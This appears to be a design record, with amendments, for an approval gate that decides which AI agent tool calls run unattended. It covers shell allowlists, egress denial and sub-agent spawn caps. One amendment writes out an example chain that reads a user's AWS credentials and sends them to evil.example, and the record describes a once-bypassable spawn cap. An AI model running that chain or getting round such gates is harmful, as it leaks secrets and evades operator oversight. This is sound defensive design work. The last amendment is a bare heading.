# An egress-denied shell policy reduces the orienting burst, and the spawn stays gated

**Dated:** 2026-09-17 · **Amended:** 2026-09-17, 2026-09-21, 2026-09-22, 2026-09-24 — see the amendments at the end ·
**Status:** routing decision recorded; built on branch `experimental-gate-policy` ·
**Origin:** an operator request (2026-09-17) to reduce approvals to *"only the important
decisions"*, naming read-only `Bash`, task claiming, and sub-agent starts ·
**Builds:** [`2026-08-11-research-phase-auto-approval.md`](2026-08-11-research-phase-auto-approval.md) ·
**Departs from** 08-11 on one axis — the preset is egress-**denied**, so it is not 08-11's
`RESEARCH` ·
**Declines:** [`2026-09-03-a-dangerously-autonomous-mode.md`](2026-09-03-a-dangerously-autonomous-mode.md)
for this branch, and says why ·
**Corrects:** `2026-09-03` §8's second condition — see §4

> The filename still says *"a research policy"*. It is left alone deliberately: the other
> records link to this path, and a stale slug is cheaper than a broken link.

**Two recorded designs could have served this request and they are not the same design. This
one routes to 08-11, because the request named read-only `Bash` and that is 08-11's axis.**
Of the three things the operator asked for, one is already built, one is declined with its
reasoning, and one is the branch.

This record is the routing and its corrections. It does not restate either source design; both
are still the specification for what they cover.

---

## 1. Two designs, one axis apart

`2026-08-11` and `2026-09-03` both make the orienting burst stop parking the session, and a
reader who has only seen the task board could be forgiven for thinking they are two drafts of
one idea. They differ on the axis 08-11 itself named — mutation — and they differ completely:

| | `2026-08-11` | `2026-09-03` |
|---|---|---|
| Mutation | **denied** | **permitted** |
| Egress | permitted (`WebFetch`, `WebSearch`) | permitted, but confined to an allowlist |
| `Bash` | a fail-closed command allowlist | auto-approved wholesale |
| What contains it | the allowlist, plus a phase that ends | `bwrap`, default-deny egress |
| Status | proposed, not built | §8a step 1 done (probe, 2026-09-04); steps 2–6 unbuilt |

> **Amended 2026-09-17:** the `2026-08-11` column describes 08-11, not this branch. The branch
> takes 08-11's mutation axis but **not** its egress row — the preset admits shellscan-passing
> `Bash` and nothing else. See the amendment at the end.

**The operator asked for read-only `Bash`.** `2026-09-03` does not offer that; its whole
premise is that mutating `Bash` runs unattended and a sandbox rather than a classifier is what
makes that survivable. Routing this request there would have delivered something strictly more
dangerous than what was asked for, behind five unbuilt steps of containment. So: 08-11.

That is a choice about *this request*, not a verdict on `2026-09-03`. The two are compatible —
08-11's `Policy` enum is the seam a later `DANGEROUS` rung would hang off, which is the whole
reason 08-11 preferred an enum over a `bool research_mode`.

---

## 2. Task claiming is already auto-approved, and has been

`approval.py`'s `_BUS_AUTO` contains `read_inbox`, `read_board`, `claim_task`, `complete_task`
and `release_task`. Nothing to build; the request's second item is already true.

The comment above the set is the reasoning, and it is worth quoting because it is also the test
the rest of this record applies: *"a worker taking the next item off a board the operator
already approved is not a second decision."*

**`declare_task` is deliberately not in that set**, and the comment records why it was removed:
*"it was auto-approved on the premise that the board had already been approved, and nothing had
ever approved it."* Declaration is where work comes into existence, and editing a parked
declaration through `updatedInput` rewrites `detail`, `depends_on` and `touches` before the task
lands — so the gate there sets the *size* of the work, not just a yes.

That is precisely an important decision of the kind this request wants to keep. A reader coming
to this branch with the operator's premises will expect `declare_task` to be in scope for
relaxation. It is not, and the reason is that the premise the relaxation would rest on is the
one thing declaration has not got.

---

## 3. What the branch actually builds

08-11 §1–§5 is the specification. Three things about how it was taken are decisions rather than
transcription:

**`Policy` is a parameter on `classify`, and `STRICT` is proved bit-identical.** 08-11 §1 argues
the enum over a boolean on retrofit grounds; the branch adds the enum with `RESEARCH` initially
empty, so the OFF path is a default argument over the existing corpus and can be tested as such
before any behaviour exists to confuse it.

**The command classifier is its own module, `shellscan.py`, not part of `approval.py`.** 08-11
§2 does not say where it lives. `approval.py`'s docstring commits it to being a small pure
policy file, and the table plus the adversarial corpus is larger than the rest of that file.
Splitting it keeps the fail-closed rule in §"The classification rule is fail-closed" readable as
one page.

**08-11 §2's scope (b) is built and (c) is not**, as recommended there. Pipelines require
approval. `grep foo | head` is the common loss and it is accepted, because (b) alone is small
enough to be read and agreed in one sitting and (c) is where the quoting edge cases live. This
is a parsing problem where the parser is the security property, and the version of it that can
be reviewed beats the version that covers more.

---

## 4. Spawns stay gated — the declined third of the request

The operator asked for sub-agent starts to stop parking. They do not, on this branch.

Three of the four arguments a reader might expect still hold, and the fourth does not:

1. **08-11 §4** — inheriting a relaxed policy through a spawn means one approval silently
   relaxes the gate for an unbounded number of downstream calls. Intact.
2. **`2026-08-22` D2** — *"a veteran's calibration for 'don't ask' is wrong in the dangerous
   direction, because the blast radius is a fan-out rather than a file."* Intact.
3. **`2026-09-03` §8 does reverse D2 and auto-approve spawns — conditionally.** Its stated
   premise is that sandbox configuration is per-CLI-process, so under §8's containment each
   additional agent has the same bounded reach as the first: fan-out multiplies spend and write
   volume but no longer multiplies *reach*, and reach is what D2's argument is about. That
   reasoning is sound and **its premise is absent here.** §8a steps 2–6 are unbuilt, so there is
   no containment for the reversal to rest on. **This is the leg that carries the decision.**

   > **Amended 2026-09-17.** The operator stated on 2026-09-17 that sandboxing is a separate
   > feature that is coming. "Unbuilt" is still true and the decision does not move, but the leg
   > it stands on is a *pending* absence rather than a permanent one: this is a decision to
   > **revisit when containment lands**, not one settled forever. What the answer should be then
   > is not decided here, and nothing on this branch is written toward that feature.
4. ~~"A cap a sub-agent can spawn around is not a cap."~~ **Retired. The hole is closed.**

### The correction: `2026-09-03` §8's second condition is now satisfied at admission

§8's *Remaining open* sets two non-optional conditions on auto-approving spawns. The second
reads *"The cap must actually bound total fan-out, which is not yet established"*, on the
observation that the at-cap deny and the spawn ledger shared one predicate carrying
`and not agent_id`, so a sub-agent's own `Task` call skipped the check.

That was repaired in `74db9ab` (2026-09-13), before this branch. `_gate_tool_use` now reads two
predicates over one call: `is_spawn_call` for the cap, `spawn = is_spawn_call and not agent_id`
for the ledger. The at-cap deny tests `is_spawn_call`, so a nested spawn is admitted against the
cap like any other; the ledger keeps the narrow form, because a nested `SubagentStart` is not
attributable to the parent's entry. `2026-08-14` carries the superseding note and
`2026-09-04`'s 2026-09-08 amendment carries the measurements that motivated it.

**§8's condition 2 should be read as met, and §8d's three options as resolved to option 1.**
Anyone returning to `2026-09-03` will otherwise re-derive a defect that is not there.

**And `2026-09-04` §2 — *"The sub-agent cap does not count spawns made by sub-agents"* — is
superseded in the tree but was not amended when `74db9ab` landed.** That commit amended
`2026-08-14`, which is where the original exclusion was argued, and stopped there. So the record
that *reports* the defect still describes it in the present tense while the record that
*defended* the exclusion carries the correction. This has already cost something: the defect was
carried forward into this branch's own task board as a settled fact, from `2026-09-04`, by
someone who had `74db9ab` in the git log in front of them. The pointer is left here rather than
by editing `2026-09-04`, which is not this record's to change.

**What that does not settle, and it is the residual worth carrying.** Per the 2026-09-04
amendment's own limits, the probe ran *one* nested spawn rather than a burst, so the interaction
between nested admissions and the `_pending_spawns` ledger under concurrency is unmeasured; and
it observed the CLI's events rather than pptmstr's `_gate_tool_use`. `2026-09-03` §8 makes the
cap the *sole* volume control under its mode. A sole volume control whose concurrent behaviour
has never been measured is a thinner foundation than a repaired predicate makes it look, and
§8d's own standard — *"very likely moot is not the standard a load-bearing control is held
to"* — applies to the repair as much as it applied to the hole.

None of that changes this branch, where spawns park and the operator is the bound.

---

## 5. What this branch does not close

**The honest framing is 08-11's own**, and it should survive into any review of this branch:
this is not *"auto-approve read-only actions"*. It is *"for a bounded phase, permit unattended
shell execution from an allowlist"* — 08-11's sentence ends *"and unattended network egress"*,
and that clause is struck for this branch by the 2026-09-17 amendment below. The bound and the
allowlist are the whole safety argument, and the phase ending is half the bound.

> **Amended 2026-09-21:** that second half can no longer be relied on. Under the
> `ACT_SHAPED` revoke boundary a session that never acts never leaves the phase, so for
> an investigative session the allowlist and the operator's manual revoke carry the
> argument alone. See the amendment at the end.

**Auto-approved calls leave no approval record.** `AUTO_APPROVE` returns `_allow_with(...)` and
returns before `_park`, so no `PendingApproval` is ever constructed. Under the preset the set of
calls that are visible but not reviewable *as decisions* grows to include shell commands. (08-11
says *"and network fetches"*; the 2026-09-17 amendment below removes that half.) 08-11 recorded
the mechanism; what is new is that `2026-09-01`'s divergence
measurement now exists and rides on the same path, which raises the obvious question of whether
this branch degrades it.

**It does not, and the reason is not the one you would guess.** `2026-09-03` §1 established by
execution that auto-approving the writing tools makes `Task.writes` identically empty, because
`ApprovalResolved` is its sole writer. That argument does not reach this branch, for two
independent reasons:

- `RESEARCH` does not auto-approve `Write`, `Edit`, `MultiEdit` or `NotebookEdit`. They still
  park, still resolve, still record.
- `Bash` was never measurable there anyway. `model.WRITING_TOOLS` is exactly those four, and
  `model.written_path` returns `None` for anything outside it — so a *parked* `Bash` approval
  contributed nothing to `Task.writes` before this branch and contributes nothing after it.

So the instrument `2026-09-01` built is untouched by `RESEARCH`, and the cost of auto-approving
`Bash` here is paid entirely in the transcript's reviewability rather than in the measurement.
That asymmetry is the concrete thing the mutation axis buys, and it is worth stating because it
is the clearest argument for 08-11 over `2026-09-03` that neither record makes: **denying
mutation is what lets the sensor keep working.**

**Not closed, and deliberately not:** cwd-containment on the `Bash` allowlist, which 08-11
declined as a separate decision on the grounds that `Read` already auto-approves any path and
making the shell path stricter than the native read path for the same capability is incoherent.
Either both get containment or neither does. This branch does not make that decision either.

---

## 6. The open question this branch rests on and did not answer

> **Amended 2026-09-21 — answered, and closed.** The operator ruled on 2026-09-17 that
> batch approval is rejected as a substitute and that this measurement will not be taken.
> A different open question replaces it, and the second half of this section — whether
> `Bash` is really the bulk of the burst — is *not* closed by that ruling. See the
> amendment at the end.

08-11 asked it plainly and it is still unanswered: **has batch approval actually been used for a
full session?**

`ui/review.py` has `approve_all_for_node`, bound to Shift+A on the focused agent. 08-11's own
words: *"If Shift+A twice per session is the real cost, this document is not worth
implementing."* The structural argument against batch approval is that it is reactive — it
reduces keystrokes, not the number of times the operator has to be present — and that argument
is sound on its face. But it was never weighed against a measurement, and neither was 08-11's
other load-bearing assumption, that `Bash` is *the bulk* of the burst rather than a plausible
guess at it. 08-11's first open question raises exactly that and proposes scope (a) alone as the
cheap way to find out; the branch skipped that step.

**Recorded as a thing this branch rests on and did not establish**, so the next reader is not
left thinking the measurement was taken and came out favourably. If the burst turns out to be
two Shift+A presses, this branch is a `Policy` enum and a shell parser bought for nothing, and
the enum is the only part worth keeping.

---

## 7. Verification standard for this record

**Verified by execution this session**, against the working tree of
`experimental-gate-policy` (`85c95d1` plus this branch's in-flight work) by reading the named
symbols and by `git show`:

- `_BUS_AUTO`'s five members and the comment above it, and `_BUS_DECLARE`'s presence in
  `_REVIEW` with its recorded reasoning — `pptmstr/approval.py`.
- `classify(tool_name, tool_input)` takes no policy argument, and the fail-closed fallthrough is
  the final statement — `pptmstr/approval.py`.
- `_gate_tool_use`'s split predicate, and that the at-cap deny tests `is_spawn_call` while the
  ledger uses `spawn` — `pptmstr/driver.py`.
- `AUTO_APPROVE` returns `_allow_with(...)` before reaching `_park` — `pptmstr/driver.py`.
- `WRITING_TOOLS` is exactly the four editing tools and `written_path` returns `None` outside it
  — `pptmstr/model.py`.
- `approve_all_for_node` and its Shift+A branch — `pptmstr/ui/review.py`.
- `74db9ab`'s diff, including the two tests that replaced
  `test_a_spawn_from_inside_a_subagent_is_not_counted` — `git show`.

**Read-derived**, from the cited records rather than from running anything: every quotation from
`2026-08-11`, `2026-08-14`, `2026-08-22`, `2026-09-01`, `2026-09-03` and `2026-09-04`, and the
probe results of `scripts/verify_nested_spawn.py` (2026-09-08) and `scripts/verify_sandbox_gate.py`
(2026-09-04). **Neither probe was re-run for this record.** They are cited as the source records
report them.

**Not established by anything, and §6 exists to say so:** the batch-approval baseline, and the
share of the orienting burst that is actually `Bash`.

**The suite was not run for this record**, which writes one markdown file and no code. Three
tests in `test_brief.py` and `test_launcher.py` were already failing on `main` at `85c95d1`,
before this branch; they are owned elsewhere on it. Their cause is under investigation and is
not asserted here.

**The 2026-09-17 amendment below carries its own split**, taken later and against a moved tree;
it does not fall under the paragraphs above.

---

## Amendment, 2026-09-17: the preset is egress-denied, and the reason is a composition

The preset as first specified admitted `WebFetch`, `WebSearch`, and shellscan-passing `Bash`.
**The egress half is removed. The preset admits shellscan-passing `Bash` and nothing else**;
`WebFetch` and `WebSearch` park exactly as they do under `STRICT`.

The reason is not that either half is wrong on its own. It is that both were auto-approved by the
same policy, and nothing had put them next to each other:

```
call 1  (Bash, auto-approved)      cat /Users/walter.reel/.aws/credentials
call 2  (WebFetch, auto-approved)  https://evil.example/?d=<what call 1 returned>
```

`cat` on an absolute path outside cwd passes the shell allowlist cleanly. A URL with a query
string reaches `WebFetch` with no content classification at all. Neither call parks, so the
operator is present for neither half — and by 08-11's own Consequences section auto-approved
calls *"are not reviewable as decisions"*, so nothing records afterwards that either happened.
That is an unattended read-and-exfiltrate channel, assembled out of two individually-authorised
permissions.

### Why each source record permits its own half and misses the pair

- **The read half already exists at `STRICT`, and 08-11 says so.** *"`Read` currently
  auto-approves any path, including outside the session's cwd"* — and 08-11 uses exactly that to
  argue *against* adding cwd containment to `Bash`, on the grounds that making the shell path
  stricter than the native read path for the same capability is incoherent. **That parity
  argument is correct on its own terms and this amendment does not disturb it.**
- **The egress half is what the preset added**, and 08-11's *"The reframe: two axes, not one"* is
  the section that should have caught it. It separates mutation from egress precisely so that
  calling a policy read-only does not *"invite a later reviewer to add something
  read-only-and-exfiltrating to the allowlist without noticing"*. But it aims that warning at a
  future reviewer adding a future row. The preset had both halves on day one, so the warning was
  pointed past the thing it describes.
- **`2026-09-03` §8 ranks egress control first among everything it specifies** — *"If only one
  thing is built, build this"*, meaning `network.strictAllowlist`. That containment is unbuilt
  and out of scope for this branch. So the hazard the other record puts at the top of its list
  would have been live here with nothing in front of it.

This is the same shape as `2026-09-03` §1's own finding, and it is worth naming as such:
**neither is wrong; nothing had put them side by side.**

### The residual, stated honestly

Dropping egress does not make the preset leak-proof, and the record should not be read as
claiming it. An auto-approved `cat` still puts file contents into the model's context, and the
context is transmitted to the API. `2026-09-03` §8b.8 makes the general form of the point:
*"Isolation changes nothing about what leaves the machine for the model. Anything the agent reads
is transmitted, sandboxed or not."*

What dropping egress removes is narrower and worth stating exactly: **the channel to an arbitrary
third party, completing with no operator present and no approval record of either end.** What
remains is the pre-existing `STRICT`-level exposure that `Read` already has.

**cwd containment is not reopened here.** 08-11 defers it explicitly, `2026-09-03` §9 re-defers
it, and §5 above records that this branch does not make that decision either. This amendment
records a *consequence* of that deferral — the read half of the composition is what the deferral
leaves in place — and deliberately stops there.

### Naming: this is not 08-11's `RESEARCH`

08-11 defines `RESEARCH` as **mutation-denied, egress-permitted** and names it that way
deliberately — *"name the policy by what it permits, not by 'read-only'"*. An egress-denied
preset carrying that name is an enum member asserting something false about its own contents,
which is the `STYLE.md` §2 failure mode of a name that is a claim the body does not make. So the
member is being renamed away from `RESEARCH`.

**The new name is `Policy.PERMISSIVE`.** The by-name admission set is gone rather than renamed:
with the two web tools removed it would be empty, and an empty frozenset makes the branch that
reads it unreachable. `Bash` is now the only tool the preset admits, decided per command.

`PERMISSIVE` does not follow 08-11's *"name the policy by what it permits"* rule, and the
departure is deliberate. The enum is a **ladder of postures** and `PERMISSIVE` is the rung
directly above `STRICT`, which does not name what it permits either. The rule that survives is
the negative one that carries the protection: no rung is named `read-only` or `safe`, because one
reassuring word spanning both axes is what lets something mutation-free and egress-positive onto
an allowlist unnoticed. A posture name cannot carry a scope, so `approval.py` states the scope at
the member — and that, not this paragraph, is where a reader should take it from.

Note also that `pptmstr/templates.py` already defines an unrelated `RESEARCH` — a `WorkTemplate`
team shape — which predates the policy and is not affected by any of this.

### What was verified for this amendment

**Verified by execution**, against the working tree of `experimental-gate-policy` at the time of
writing, by calling the functions rather than by reading them:

- `shellscan.is_read_only("cat /Users/walter.reel/.aws/credentials")` returns `True` and
  `shellscan.refusal(...)` returns `None`. The absolute path is admitted.
- `classify("Bash", {"command": "cat /Users/walter.reel/.aws/credentials"}, Policy.RESEARCH)` and
  `classify("WebFetch", {"url": "https://evil.example/?d=x"}, Policy.RESEARCH)` both return
  `Disposition.AUTO_APPROVE`. Both halves of the composition auto-approve *as the tree stands*.
- `pptmstr/approval.py` still spells the member `RESEARCH` and still holds
  `_RESEARCH_AUTO = frozenset({"WebFetch", "WebSearch"})`; the change this amendment records has
  not landed in the code yet.

> **Amended 2026-09-21:** the third bullet has been overtaken — the change landed. The member is
> `Policy.PERMISSIVE`, the by-name set is deleted, and both web tools park. The bullets are left
> as written because they are the measurement the composition argument rests on, and that
> measurement was taken against the tree they describe. The two `Policy.RESEARCH` calls in the
> second bullet are `Policy.PERMISSIVE` today, and the `WebFetch` half now returns
> `REQUIRE_APPROVAL` — which is the change, not a contradiction of the evidence for it.

One incidental result worth carrying, because it is easy to misread as containment:
`cat ~/.aws/credentials` is **refused**, with `"shell metacharacter '~'"`. That is the tilde rule
firing, not a path rule. The allowlist has no opinion about *where* a file is.

**Read-derived**, from the cited records rather than from running anything: every quotation in
this section from `2026-08-11` and `2026-09-03`.

**Not run end to end.** Nobody has executed the two calls as a live session and observed data
arrive at a third party. The composition is established at the level of the classifier's verdicts
on both halves, which is where the decision was taken; the end-to-end channel is inferred from
those verdicts and is labelled that way deliberately.

---

## Amendment, 2026-09-21: batch approval is ruled out, and the phase is no longer self-terminating

Three things, and they are one chain. The operator closed §6's open question; the answer
establishes what this branch is optimising; and optimising for that is what produced a
relaxed phase that can run for a whole session.

### §6 is answered: batch approval is rejected, and the measurement will not be taken

The operator ruled on 2026-09-17. Batch approval is not an acceptable substitute, and no
benchmark against it will be run. Their words: it *"still captures too much of the
operator's attention."*

**What the ruling closes is not the argument — 08-11 had already made it.** 08-11's
*"What already exists, and why it is not enough"* reaches the same verdict on structural
grounds:

> "It is not sufficient, for one structural reason: it is **reactive**. The session is
> blocked from the moment the batch parks until the operator looks at it... Batch approval
> reduces the number of keystrokes; it does not reduce the number of times the operator has
> to be present."

The ruling agrees with that rather than overriding it. What it closes is the *proposal*,
made in the same record and carried forward by §6, that the feature be benchmarked against
Shift+A before being built. 08-11 put the stake plainly — *"If Shift+A twice per session is
the real cost, this document is not worth implementing"* — and that is the conditional
being discharged. The branch does not rest on it.

**§6's other half is not closed by this**, and it should not be read as though it were.
08-11's second load-bearing assumption — that `Bash` is *the bulk* of the orienting burst
rather than a plausible guess at it — is untouched by a ruling about batch approval. It
reappears below.

### The metric is presences, not keystrokes, and it has already decided two things

**The quantity this branch reduces is the number of times the operator has to be present.
The number of keystrokes is not that quantity.** That is the ruling's content beyond the
yes/no, and it is recorded here because it has already settled two design questions rather
than because it is a nice framing.

**1. It decided the auto-revoke boundary.** 08-11 §3 ends the phase at *"the first call
that still requires approval"*. Taken literally that hands the presence straight back: for
a team lead the first spawn parks, so the phase ends before any `Bash` runs at all. A phase
that ends at the first park does not remove a presence, it defers one. Ending only on
act-shaped calls is what makes the phase last long enough to remove one. The boundary as
built is `ACT_SHAPED` in `pptmstr/approval.py`; the fuller argument is the comment at the
`classify` call site in `pptmstr/driver.py`.

**2. It reversed 08-11 §2's deferral of pipeline support** — scope (c), which §3 above
records as deliberately not built. A refused `git log --oneline | head -20` costs one full
presence, and a presence is the unit. Under the keystroke framing a refused pipeline is a
rounding error; under the presence framing it is precisely the cost the feature exists to
remove.

(c)'s risk profile changed independently of the metric, and the reversal needs both halves.
08-11 declined (c) when a pipeline segment could be `grep`, `rg`, `ag`, `sed`, `find`,
`file` or `tree` — *"more surface, and the quoting edge cases are where it will be wrong"*.
All seven have since been deleted from the table, each after producing a write or exec
primitive. Against the table as it now stands, what (c) adds is the splitting, not the
commands.

### The relaxed phase is no longer bounded by anything the gate does

A property of the branch as built, not a defect. It is recorded because it inverts
something 08-11 and the rest of this record assume throughout, and nothing else says it.

`ACT_SHAPED = _REVIEW - _NOT_ACT_SHAPED`, where `_NOT_ACT_SHAPED` is `Bash`, `BashOutput`,
`KillShell`, `WebFetch` and `WebSearch`. The revoke fires only when a root call is in
`ACT_SHAPED` and did not auto-approve. So:

- A root `Bash` **cannot end the phase at all.** It either auto-approves, or it parks
  without revoking.
- `Read`, `Grep` and `Glob` are in `_AUTO`. They never park, so they never reach the test.
- The only endings left are an act-shaped park — a write, a spawn, `post_concern`,
  `declare_task` — and the operator's own revoke from the tree.

**A session that reads, greps and runs shell commands but never writes, never spawns and
never messages another agent stays relaxed for its entire length.** An investigation or a
review is exactly that session, and it is a session shape this project runs deliberately.
08-11 §3 designed the phase as a bounded orienting window terminating at orient → act. It
now terminates only if the session acts, and some sessions never do.

**Read §5 with this.** §5 states the safety argument as *"the bound and the allowlist are
the whole safety argument, and the phase ending is half the bound."* For a session that
never acts, that half is absent and the allowlist carries it alone. This does not make the
design wrong: everything admitted is read-only by table, the table is fail-closed, and the
operator can still end the phase. It does mean the record cannot go on claiming a
self-terminating bound as a general property, and **anyone still reading the relaxed phase
as inherently short-lived is wrong.** It was short-lived before the boundary moved, for a
measured reason rather than a designed one — the table admits a few percent of real `Bash`,
so under the old rule the first refused command ended the phase almost immediately. The
property everyone was relying on was an artefact of the table being narrow.

**A seam this leaves, flagged rather than settled.** With egress denied, `WebFetch` parks —
and being in `_NOT_ACT_SHAPED` it parks *without* revoking. So a parked `WebFetch` or
`KillShell` costs a presence and leaves the phase running, which no other root call does:
everything else either auto-approves (no presence) or revokes (presence, and the phase
ends). `approval.py` justifies the exemption as *"egress, not mutation, and reading the
world is orienting"*. That sentence was written while `WebFetch` auto-approved, where it
argued for not asking; whether it also justifies asking and then not revoking has not been
decided by anyone. Small, but nobody has looked at it.

### The open question that replaces the one being closed

The branch is not left without one, and the replacement is sharper because half of it is
now measured.

**Measured — what fraction of real `Bash` the table admits.** Every `Bash` command in the
operator's own transcript history, run through the live `shellscan.refusal`:

| | admitted |
|---|---|
| the table as built | 3.6% |
| + sequence support alone | 4.9% |
| + `grep`/`rg` | 11.6% |
| + `sed` print-range | 16.1% |
| + `cd` | 20.6% |
| the same widenings *without* sequence support | 9.9% |

So the branch as it stands leaves ~96% of `Bash` parking, and the widenings queued behind
this record take that to roughly four in five still parking. **The branch's value is
proportional to this fraction**, and the honest question is no longer *what is it* but
*whether one call in five is enough to remove a presence rather than merely thin one.* A
phase that admits 3.6% does not remove a presence; it is not obvious that 20.6% does
either, and that is the question to hold the widenings to.

**Answered, 2026-09-22: no. It thins the presence and does not remove it, and the rate
is now roughly two in five rather than one.** See the amendment below.

Two further facts from the same run, because they change how the table reads. Sequence
support is nearly worthless alone (+1.3 points) and roughly doubles everything else — `cd`
adds 0.0 points without it and 4.5 with it, because `cd X` alone is not a thing anyone runs.
And under the fullest widening the two largest categories of *still-refused* calls are `cd`
(450) and `grep` (278) — commands that widening explicitly admits, refused because some
other segment of the same sequence failed. Admit rate is gated by the weakest segment, so it
does not compose the way a cumulative table makes it look.

**Not measured — 08-11's original assumption, that `Bash` is the bulk of the burst.** This
is a different quantity from the one above and it is the one §6's second half named. The
table above says what share of *`Bash`* is admitted; it says nothing about what share of the
*orienting burst* is `Bash` rather than `Read`, `Grep`, `Glob` or a bus call. Those are
already auto-approved at `STRICT`, so if `Bash` is a small tail of the burst then a large
admit rate on it still buys little. **Nobody has measured that, and this branch rests on it
exactly as 08-11 did.** It is the one thing from §6 that survives the ruling intact.

### What was verified for this amendment

**Verified by execution this session**, against the working tree of
`experimental-gate-policy`:

- The admit-rate table above, by running `/tmp/measure_candidates.py` — reproduced rather
  than quoted. ~~The script is not in the tree; moving it to `scripts/` is queued
  separately, and until it is there this table is not re-runnable by a later reader,
  which is a real weakness of citing it here.~~ **Retired 2026-09-22:** the script is
  `scripts/measure_bash_burst.py` and the table is re-runnable. The stated weakness was
  real and it was worse than stated — see the 09-22 amendment.
- `ACT_SHAPED`, `_NOT_ACT_SHAPED` and their five members, and that `Read`/`Grep`/`Glob` sit
  in `_AUTO` — `pptmstr/approval.py`.
- That the revoke is guarded by `at_root and tool_name in ACT_SHAPED and disposition is not
  Disposition.AUTO_APPROVE`, so a root `Bash` never reaches `revoke_policy` —
  `pptmstr/driver.py`.

**A discrepancy in the corpus size, left visible rather than reconciled.** The figures this
branch was redirected by were reported over 2271 `Bash` calls from 139 transcripts; the run
above found 2105 from the same source directory. Every percentage agrees within 0.4 points,
which is why the table is quoted at all, but the corpus count does not, and no one has
explained why a transcript directory shrank. Treat the percentages as robust to roughly a
point and the absolute counts as not yet trustworthy.

**Read-derived**, from the cited records rather than from running anything: every quotation
from `2026-08-11`, and 08-11 §2's reasoning for deferring scope (c).

**Not verified, and taken on report:** that each of the seven deleted table rows was deleted
after producing a write or exec primitive. That is the task board's account of work done
elsewhere on this branch; this amendment did not re-derive the seven findings.

**Stated by the operator, not measured:** the ruling itself, and *"still captures too much
of the operator's attention"*. It is a preference and it is recorded as one. No batch-approval
session was instrumented, and per the ruling none will be.

---

## Amendment, 2026-09-22: the widenings landed, the rate roughly doubled, and the open question is answered no

Four changes to `shellscan` landed on 2026-09-22 — an `echo` row, a quote-aware segment
split, a `2>/dev/null` strip, and the repair of the measuring script itself. The
09-21 amendment's open question was held against the widenings queued behind it. They
are in the tree, so the question can be answered rather than restated.

### The rate, re-measured

`scripts/measure_bash_burst.py`, exit status 0, self check 14/14, monotonicity clean.
149 transcript files, 85 with a `Bash` call, 2755 calls, 39 of the files sessions and
46 sub-agent slices.

| | 09-21 estimate | 09-22 measured |
|---|---|---|
| the table as built, no sequence support | 3.6% | 11.3% |
| the tree today, all calls | 20.6% (projected) | 41.1% |
| the tree today, sessions only | — | 38.1% |
| first 3 calls of a session | 27.1% | 53.8% |
| first 10 | 11.6% | 49.3% |

**Read those two columns as direction and magnitude, not as a row-for-row delta**, for
two reasons that both inflate the apparent improvement. The 09-21 rows were candidate
*simulations* of widenings that had not landed; every one the script can simulate has
since landed, so its arms now score as the tree does and the cumulative shape the old
table had is gone. And the first-N population changed: the script used to treat one
transcript file as one session, which counted 46 sub-agent slices as sessions, and
those admit at roughly twice a session's opening rate. Both were repaired the same day.

### Which widening bought what

Measured by removing one at a time from the live classifier, so each delta is that
widening's contribution against the other two being present. Sessions only.

| | sessions | first 3 |
|---|---|---|
| the tree before the 09-22 widenings | 14.1% | 17.9% |
| + the quote-aware split alone withheld | 27.2% | 47.9% |
| + the `2>/dev/null` strip alone withheld | 32.2% | 36.8% |
| + the `echo` row alone withheld | 22.2% | 30.8% |
| all three | **38.1%** | **53.8%** |

The `echo` row is the largest single mover, at 15.9 points, which is not where anyone
expected the value to be: `echo` reads nothing and is on the table purely as the label
between batched reads. The three deltas sum to 32.7 points against a combined gain of
24.0, so they overlap heavily — a command frequently needs two of them before it
admits. That is the same non-additive property §"two further facts" records for
sequence support, and it is the reason a table of cumulative arms overstates each row.

The 14.1% baseline row is the tree *after* `t-widenings` and before the 09-22 work. It
is not the 09-21 amendment's 3.6%, which was a narrower table measured over a different
corpus with a different session definition. The two do not subtract.

### The question, answered

*Whether one call in five is enough to remove a presence rather than merely thin one.*

**No, and two in five is not either.** The rate is the wrong statistic for that question
and the right one is per-session, measured the same run:

| | sessions |
|---|---|
| whose first Bash call is admitted | 28/39 |
| whose first 3 Bash calls all admit | 9/39 |
| whose first 10 all admit | 2/39 |
| with no parked Bash call at all | **0/39** |

Not one session in the corpus gets through its `Bash` traffic without stopping for the
operator. A presence is removed only by a session that never parks, and at 38.1% per
call a session of any length will park — the per-call rate compounds against itself.
What 38.1% buys is a *later* first presence and fewer of them, which is worth having and
is not what the phase was sold as.

This does not argue for widening further. The still-refused residual is `cd` in a
composite, `source`, `.venv/bin/python`, `make` and `gh`, and 506 of 1622 refusals have
a head segment the table already admits and fail on a later one. Those are not unlocked
by another row. §"Why it cannot go further" in the 09-21 handover note already gives the
reason and it is unchanged: the sandbox work changes the question from "can I decide
what this command does" to "can I bound what any command can do", and that is the only
thing that moves this number materially.

### A caveat that is new, and it points the wrong way

46 of the 85 files with a `Bash` call are sub-agent slices, carrying 1217 of the 2755
calls, and a large share of them are this branch's own agents probing this branch's own
gate over the last three days. They admit at 81.2% on their own first three against a
session's 53.8%. **The corpus now measures the experiment along with the subject, in the
flattering direction.** 41.1% is the honest answer to "what fraction of `Bash` calls
does the gate admit" and 38.1% is the honest answer to "what fraction of an operator's
session", and the second is the one this record's argument is about.

The 09-21 amendment's caveat about corpus counts stands and has not improved, and this
session watched it happen. Two runs minutes apart saw the corpus grow from 2755 to 2796
`Bash` calls and the all-calls rate move 41.1% -> 41.5%, while the session figure sat at
exactly 586/1538 = 38.1% in both. The drift is entirely in the agent traffic, which is
a second reason to publish the session number: it is the stable one as well as the
honest one. Percentages are robust to roughly a point; absolute counts are dated
snapshots.

### What was verified for this amendment

**Verified by execution this session** (`.venv/bin/python`, 2026-09-22):

- Every figure above, by running `scripts/measure_bash_burst.py` and reading its output,
  against the tree at `c47bd0e` with all four changes committed. The per-session and
  per-widening tables are not in that output; they were computed in the same process
  from the script's own `read_corpus` and the live `shellscan.refusal`, so they share
  the corpus and the classifier with the rest. The per-widening figures were produced
  by removing each widening from the live module, never by a copy of its rule.
- That the script exits 0. It exited 1 before the same day's repair, on monotonicity
  rather than on its self check.
- The four `shellscan` changes, each against the adversarial corpus in
  `tests/test_shellscan.py`, and the segment split additionally against `/bin/bash`
  itself via `scripts/verify_split_against_bash.py` — 25521 candidate strings, 5167 of
  which reached the requirement, no holes.

**Taken on report, not re-derived:** that the measuring script's four defects were what
the task board said they were. They were repaired by another agent this session and this
amendment quotes the repaired script's output rather than auditing the repair.

**Not measured, and unchanged from the 09-21 amendment:** 08-11's assumption that `Bash`
is the bulk of the orienting burst. Every figure here is a share of `Bash`, and nothing
has measured what share of the burst `Bash` is.

---

## Amendment, 2026-09-24: `PERMISSIVE` inherits to sub-agents, and the spawn stays gated

